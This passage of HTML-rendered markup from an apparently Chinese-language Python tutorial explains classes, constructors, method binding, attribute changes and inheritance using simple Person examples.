&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.v)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;P=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(P.version)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;P.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;setversion&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2.0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(P.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printver&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;下面这个例子有构造函数：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;v&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.v=v&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printver&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.v)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;P=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3.0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(P.version)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(P.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printver&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;绑定限制：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;male&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)  &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaohong=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaohong&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;female&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Person.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;()) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#Python有严格要求，没有实例，方法&#x2F;函数都不能被调用，这种限制称为绑定&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;属性修改：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;male&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)  &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaohong=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaohong&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;female&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Person.version)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.version)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming.version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2.0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.version) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#实例属性修改不影响类属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Person.version)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.age)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming.age=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.age)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;属性增加：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;Xiaoming.aihao=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xuexi&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.aihao)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;查看属性：&lt;&#x2F;p&gt;
&lt;p&gt;dir（）__ &lt;strong&gt;dict&lt;&#x2F;strong&gt;__&lt;&#x2F;p&gt;
&lt;p&gt;特殊类属性：&lt;&#x2F;p&gt;
&lt;p&gt;特殊类属性的命名方式以__value__方式命名，前后都有两个下划线&lt;&#x2F;p&gt;
&lt;p&gt;特殊类属性是Python的内置属性，所有创建的类默认都有&lt;&#x2F;p&gt;
&lt;p&gt;c.&lt;strong&gt;doc&lt;&#x2F;strong&gt; 查看类c的文档字符串&lt;&#x2F;p&gt;
&lt;p&gt;c.&lt;strong&gt;dict&lt;&#x2F;strong&gt; 查看类c的属性&lt;&#x2F;p&gt;
&lt;p&gt;c.&lt;strong&gt;name&lt;&#x2F;strong&gt; 查看类名&lt;&#x2F;p&gt;
&lt;p&gt;c.&lt;strong&gt;module&lt;&#x2F;strong&gt; 查看类c定义所在的模块&lt;&#x2F;p&gt;
&lt;p&gt;c.&lt;strong&gt;base&lt;&#x2F;strong&gt; 查看类的所有父类构成元素&lt;&#x2F;p&gt;
&lt;p&gt;类的继承：&lt;&#x2F;p&gt;
&lt;p&gt;当编写一个类的时候，可以从之前的类继承，这样就可以获取之前类的所有属性&lt;&#x2F;p&gt;
&lt;p&gt;新的类我们称为子类，而被继承的类称为父类&#x2F;基类&#x2F;超类&lt;&#x2F;p&gt;
&lt;p&gt;人（超类）—男人（子类）—小明（实例）&lt;&#x2F;p&gt;
&lt;p&gt;继承的语法：&lt;&#x2F;p&gt;
&lt;p&gt;class Parent():&lt;&#x2F;p&gt;
&lt;p&gt;​	…&lt;&#x2F;p&gt;
&lt;p&gt;class Child(Parent):  子类在父类上创建&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
